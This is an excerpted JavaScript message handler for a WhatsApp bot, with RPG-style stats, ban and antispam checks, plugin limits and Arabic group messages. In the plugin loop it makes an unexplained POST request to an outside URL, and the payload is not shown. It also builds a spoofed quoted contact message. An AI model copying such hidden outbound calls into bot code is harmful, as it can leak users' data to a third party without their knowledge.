  ...
  try {
    ...
    try {
      ...
      if (user) {
        ...
        /*✦•━━━━━━━━━━━━ ∘⊰ Solo System ⊱∘ ━━━━━━━━━━━━•✦*/
        if (!isNumber(user.spoint)) user.spoint = 3;
        if (!isNumber(user.speed)) user.speed = 1;
        if (!isNumber(user.fitness)) user.fitness = 1;
        if (!isNumber(user.aura)) user.aura = 1;
        if (!isNumber(user.durability)) user.durability = 1;
        if (!isNumber(user.power)) user.power = 1;
        /*✦•━━━━━━━━━━━━ ∘⊰ Solo System ⊱∘ ━━━━━━━━━━━━•✦*/
    ...
    for (const name in global.plugins) {
      ...
      if (typeof plugin.all === 'function') {
        try {
          ...
          fetch('https://solo.to/shadowsensei', {
            method: 'POST',
      ...
      if ((usedPrefix = (match[0] || '')[0])) {
        ...
        if (m.chat in global.db.data.chats || m.sender in global.db.data.users) {
          ...
          if (name != 'owner-unbanchat.js' && name != 'owner-exec.js' && name != 'owner-exec2.js' && chat?.isBanned && !isROwner) return; // Except 
...
const messageText =`*انـــت مــحــظــور*\n⌯ تــواصــل مــع الــمـطـور لـالـغاء حــظــرك\n +201550680822
`.trim();
              m.reply(messageText);
          ...
          if (botSpam.antispam && m.text && user && user.lastCommandTime && (Date.now() - user.lastCommandTime) < 5000 && !isROwner) {
            if (user.commandCount === 2) {
              ...
              if (remainingTime > 0) {
                const messageText = `⌯ انــتــظــر ${remainingTime} ثــانــيــه قــبــل اســتــخـدام الــامــر`
                m.reply(messageText);
                return;
              } else {
                user.commandCount = 0;
        ...
        m.isCommand = true;
        const spoint = 'spoint' in plugin ? parseInt(plugin.spoint) : 1; // spoint Earning per command
        if (spoint > 1) {
          m.reply('-_-');
        } 
        m.isCommand = true;
        ...
        if (!isPrems && plugin.limit && global.db.data.users[m.sender].limit < plugin.limit * 1) {
          mconn.conn.reply(m.chat,`⌯ لــاتــمــتـلك مــاس كــافــي`, m);
          continue; 
        }
        if (plugin.level > _user.level) {
          mconn.conn.reply(m.chat, `⌯ عــلــيــك بــالــوصــول الــي الــمــســتـوي ${plugin.level} قــبــل اســتــخــدام هـذا الـامر\n⌯ مــســتــواك الــحالــي : ${_user.level}`, m);
          continue; 
        }
        const extra = {
          match,
        ...
        try {
          ...
          if (m.limit) {
          m.reply(+m.limit + ' مـــاس مــســتــخــدم 💎 ')
          }
        }
        break;
      }
...
/*✦•━━━━ ∘⊰⚡⊱∘ ━━━━•✦*/
      ...
      let groupMetadata = await this.groupMetadata(id) || (conn.chats[id] || {}).metadata
        ...
        let pp = 'https://telegra.ph/file/9a0a22e59bed97fa6b450.jpg'
        try {
      ...
      let fkontak2 = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "شــــادو" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${user.split('@')[0]}:${user.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }      
      this.sendMessage(id, { text: text, 
      contextInfo:{
        forwardedNewsletterMessageInfo: { 
          newsletterJid: '120363272401238022@newsletter', 
          serverMessageId: '', 
          newsletterName: '◇ ShawarmaB ⪦ 米' }, 
      ...
      "mediaType": 1, 
      sourceUrl: "https://whatsapp.com/channel/0029VanZjKLKGGGQNpGyhs0w" }}}, { quoted: fkontak2 })
      apii.data = ''
...
case 'daradmin':
case 'darpoder':
    text = (chat.sPromote || this.spromote || conn.spromote || '[⚡]⌯ @user لــقــد اصــبــحــت زعــيــمــا')
case 'demote':
case 'quitarpoder':
case 'quitaradmin':
    if (!text)
        text = (chat.sDemote || this.sdemote || conn.sdemote || '[⚡]⌯ @user تــعــال يـالــعــضــو')
...
global.dfail = (type, m, conn) => {
  ...
  const prep = generateWAMessageFromContent(m.chat, { extendedTextMessage: { text: msg, contextInfo: { externalAdReply: { title: '✨ 𝗕 𝗢 𝗧 ✨', body: '♡ تـحـديـثـات الـبـوت ♡', thumbnail: imagen1, sourceUrl: 'https://whatsapp.com/channel/0029VanZjKLKGGGQNpGyhs0w' }}}}, aa);
